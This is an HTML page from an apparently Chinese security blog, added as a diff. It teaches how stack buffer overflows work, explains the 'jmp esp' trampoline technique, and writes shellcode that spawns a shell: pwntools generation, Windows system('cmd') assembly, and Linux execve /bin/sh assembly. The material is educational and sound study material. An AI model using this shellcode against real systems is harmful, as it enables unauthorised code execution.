@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+    
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="silence">
+    <title>silence - 栈溢出漏洞（一）shellcode</title>
+    <meta name="author" content="mara silence">
+    <meta name="description" content="null">
+    <link rel="icon" href="/assets/images/null">
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox-thumbs.css">
+    <link rel="stylesheet" href="/assets/css/tranquilpeak.css">
+    <!--STYLES END-->
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <header id="header">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars "></i>
+    <h1 class="header-title">
+        <a class="header-title-link" href="http://blog.jacksecurity.com">silence</a>
+    </h1>
+    
+</header>
+            <nav id="sidebar">
+    
+    <ul class="sidebar-buttons">
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+                    <span class="sidebar-button-desc hide-md">Home</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-categories">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+                    <span class="sidebar-button-desc hide-md">Categories</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-tags">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+                    <span class="sidebar-button-desc hide-md">Tags</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/all-archives">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+                    <span class="sidebar-button-desc hide-md">Archives</span>
+                </a>
+            </li>
+        
+            <li class="sidebar-button">
+                
+                    <a  class="sidebar-button-link" href="http://blog.jacksecurity.com/#about">
+                
+                    <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+                    <span class="sidebar-button-desc hide-md">About me</span>
+                </a>
+            </li>
+        
+    </ul>
+    
+
+    <ul class="sidebar-icons">
+        
+    </ul>
+
+    <div class="links">
+        <span>Links</span>
+        <ul class="list">
+            
+                <li>
+                    
+                        <a href="http://hexo.io" target="_blank">
+                    
+                        <span class="sidebar-button-desc hide-md">Hexo</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</nav>
+            <div id="main">
+                
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
+    
+        <div class="post-header main-content-wrap">
+    
+        <h1 class="post-title" itemprop="headline">栈溢出漏洞（一）shellcode</h1>
+    
+    
+</div>
+    
+    <div class="post-content markdown main-content-wrap" itemprop="articleBody">
+        <h1 id="栈溢出原理与shellcode编写"><a href="#栈溢出原理与shellcode编写" class="headerlink" title="栈溢出原理与shellcode编写"></a>栈溢出原理与shellcode编写</h1><a id="more"></a>
+<h2 id="0x01-栈溢出"><a href="#0x01-栈溢出" class="headerlink" title="0x01 栈溢出"></a>0x01 栈溢出</h2><p>1.栈溢出基本原理</p>
+<p><font color="green" face="黑体">堆栈溢出漏洞产生的原因是程序开发者在数据读入，拷贝等操作时未校验长度<br>常常导致数据长度超过内存缓冲区，并覆盖其它内存区域。</font></p>
+<p>堆溢出与栈溢出的漏洞利用原理是不同的。通过栈溢出，攻击者可以覆盖函数返回地址，从而执行自己的shellcode。举一个缓冲区溢出的简单的例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * data)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[BUF_LEN];</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buffer,(<span class="keyword">char</span>*)data);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这个函数并没有具体的含义，只是为了简化缓冲区溢出问题，这是一段典型的缓冲区溢出代码。data的全部数据拷贝到buffer指向的内存区域。如果data的数据长度超过了BUF_LEN，便会产生缓冲区溢出。<br><img src="/image/stack_flow.png" alt="ShowImage"><br>上图中，栈增长方向是地址的减小方向，所以当数据长度超过缓冲区长度时会依次出现下列情况：</p>
+<blockquote>
+<p>1.淹没了其他的局部变量<br>2.淹没了保存的普通寄存器值和ebp值。当返回到上级函数时，ebp要恢复。<br>3.淹没了返回地址。这里是栈溢出攻击的核心所在，通过返回地址可以改变程序的执行流程。<br>4.淹没函数参数。<br>5.淹没上级函数的栈帧。如果在进行栈溢出攻击的情形下还不影响程序的执行，便不能影响上级函数。</p>
+</blockquote>
+<p>2.栈溢出攻击<br>在不考虑是否会导致程序崩溃的情况下，可以做如下的简单栈溢出攻击。</p>
+<p><img src="/image/stack_attack_basic.jpg" alt="ShowImage"><br>当程序直行到”ret”语句，也就是要返回上一层函数时，要获取当前栈帧所保存的返回地址，通过栈溢出攻击将自己shellcode的地址覆盖了原返回地址，程序<br>便会转而执行攻击者的shellcode。</p>
+<p>但上述攻击方式的前提是知道shellcode在内存中的返回地址。但在实际应用场景中显然是不可能的。借助一个跳板”jmp esp”可以使程序自动定位shellcode的地址。</p>
+<p><img src="/image/stack_attack_jmp.jpg" alt="ShowImage"><br>如上图所示，覆盖函数返回地址的不是我们shellcode的地址，而是程序中存在的一个语句”jmp esp”的地址。当程序执行到”ret”语句时，栈帧指向”jmp,esp”的地址，便去执行”jmp esp”。此时，栈帧移到了shellcode,即esp内装入了shellcode的起始地址，而执行了”jmp esp”，显然会跳到esp指向的地址执行，这里也就是我们的shellcode。通过这个跳板，我们不需要找到任何地址，便让程序自动找到了我们的shellcode。</p>
+<p>上述攻击方式存在一个问题，就是shellcode会覆盖掉上层函数的栈空间，无论shellcode是否顺利执行，可以预见，程序肯定会崩溃。为了避免这个问题可以借助第二个跳板定位到本层函数中的shellcode。</p>
+<p><img src="/image/stack_attack_jmp2.jpg" alt="ShowImage"><br>当函数执行第一次jmp,esp之后，去执行调整代码，然后再一次跳转定位shellcode。调整代码的内容很简单:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sub esp,X</div><div class="line">jmp esp</div></pre></td></tr></table></figure></p>
+<p>第一条指令是让栈帧向栈增长的方向移动X，也就是esp指向的地址减X。X是当前栈帧与shellcode起始地址的偏移，语句执行后，esp指向shellcode起始地址，这样再执行第二条语句的时候，程序便会跳到shellcode起始地址去执行。</p>
+<h2 id="0x02-shellcode-编写"><a href="#0x02-shellcode-编写" class="headerlink" title="0x02 shellcode 编写"></a>0x02 shellcode 编写</h2><p>1.使用pwntools生成shellcode<br>python的pwntools是CTF pwn题的利器，主要是针对linux平台。通过以下几行代码很容易生成linux下执行”/bin/sh”的shellcode。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">asmCode=shellcraft.i386.linux.sh()</div><div class="line">shellCode=asm(asmCode)</div></pre></td></tr></table></figure></p>
+<p>pwntools的具体使用可以参见博客<a href="http://brieflyx.me/2015/python-module/pwntools-intro/" target="_blank" rel="external">Exploit利器——Pwntools</a>与<a href="https://docs.pwntools.com/en/stable/" target="_blank" rel="external">pwntools官方文档</a></p>
+<p>2.使用编译器查看反汇编代码<br>在windows下可以使用vc6来编译C语言代码，在linux下使用gcc编译c语言代码，然后使用IDA查看反汇编代码。可以直接复制16进制的机制码，也可以使用pwntools将反汇编代码生成机器码。<br>windows平台下的一段C语言函数如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">LoadLibrary(<span class="string">"msvcrt.dll"</span>)</div><div class="line">system(<span class="string">"cmd"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译后查看其部分反汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">xor ebx,ebx ;//ebx=0</div><div class="line"></div><div class="line">push 0x3f3f6c6c ;//ll??</div><div class="line">push 0x642e7472 ;//rt.d</div><div class="line">push 0x6376736d ;//msvc</div><div class="line">mov [esp+10],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;</div><div class="line">mov [esp+11],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;</div><div class="line">mov eax,esp ;//&quot;msvcrt.dll&quot;地址</div><div class="line">push eax ;//&quot;msvcrt.dll&quot;</div><div class="line">mov eax,0x77b62864 ;//kernel32.dll:LoadLibraryA</div><div class="line">call eax ;//LoadLibraryA(&quot;msvcrt.dll&quot;)</div><div class="line">add esp,16</div><div class="line"></div><div class="line">push 0x3f646d63 ;//&quot;cmd?&quot;</div><div class="line">mov [esp+3],ebx ;//&apos;?&apos;-&gt;&apos;\0&apos;</div><div class="line">mov eax,esp;//&quot;cmd&quot;地址</div><div class="line">push eax ;//&quot;cmd&quot;</div><div class="line">mov eax,0x774ab16f ;//msvcrt.dll:system</div><div class="line">call eax ;//system(&quot;cmd&quot;)</div><div class="line">add esp,8</div></pre></td></tr></table></figure></p>
+<p>上面的反汇编代码为了避免出现字节0x00，出现0x00的部分使用初始化的ebx代替。</p>
+<p>3.自己书写shellcode<br>使用工具生成的shellcode和编译器生成的shellcode经常无法直接使用，为了应对各种各样的情况，在shellcode代码不长的情况下可以<br>自己编写shellcode。<br>linux系统下执行系统调用可以使用”int 0x80”语句。通过al传递调用号，指明要调用的系统函数，比如传递0x0b便执行sys_execve函数。<br>该函数有三个参数，分别通过ebx,ecx,edx传递。其中，ebx传递要执行的命令。ecx传递存放命令的数组地址，edx传递执行文件的新环境变量<br>数组地址，可以直接置为0。根据这些条件可以直接书写汇编代码，执行”/bin/sh”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">xor eax , eax ; 清空eax</div><div class="line">push eax ;  将0x00放入堆栈</div><div class="line">push 0x3b68732f;    将&quot;/sh;&quot;压入栈</div><div class="line">push 0x6e69622f;    将&quot;/bin&quot;压入栈</div><div class="line">mov ebx,esp;    第一个参数，也就是字符串&quot;/bin/sh;&quot;的地址</div><div class="line">push ebx;</div><div class="line">mov ecx,esp;    第二个参数，即指向存放字符串&quot;/bin/sh;&quot;的内存</div><div class="line">xor edx,edx;    清空edx，作为第三个参数</div><div class="line">mov al,0x0b;    传递系统调用号    </div><div class="line">int 0x80</div></pre></td></tr></table></figure></p>
+<p>通过以上shellcode可以执行linux的shell脚本。</p>
+
+        
+            
+        
+    </div>
+    <div class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/shellcode/">shellcode</a> <a class="tag tag--primary tag--small t-link" href="/tags/栈溢出/">栈溢出</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a>
+
+            </div>
+        
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/31/栈溢出漏洞（二）CTF爆破canary与构造ROP/"  data-tooltip="栈溢出漏洞（二）ZCTF-2017-login">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/23/格式化字符串漏洞（二）漏洞利用/" data-tooltip="格式化字符串漏洞（二）漏洞利用">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    
+</div>
+
+
+        
+    </div>
+    <div class="post-bottom-bar">
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/31/栈溢出漏洞（二）CTF爆破canary与构造ROP/"  data-tooltip="栈溢出漏洞（二）ZCTF-2017-login">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/23/格式化字符串漏洞（二）漏洞利用/" data-tooltip="格式化字符串漏洞（二）漏洞利用">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    
+</div>
+
+
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <div class="copyrights">
+        Copyrights &copy; 2017 mara silence. All Rights Reserved.
+        
+    </div>
+    <div class="copyrights">
+    	Powered by <a href="http://hexo.io/" target="_blank" rel="nofollow">Hexo</a>  
+    </div>
+</footer>
+
+            </div>
+        </div>
+        <div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <h4 id="about-card-name">mara silence</h4>
+        
+        
+        
+    </div>
+</div>
+        <div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+    </body>
+    <!--SCRIPTS-->
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/jquery.fancybox-thumbs.js"></script>
+<script src="/assets/js/tranquilpeak.js"></script>
+<!--SCRIPTS END-->
+
+
+</html>
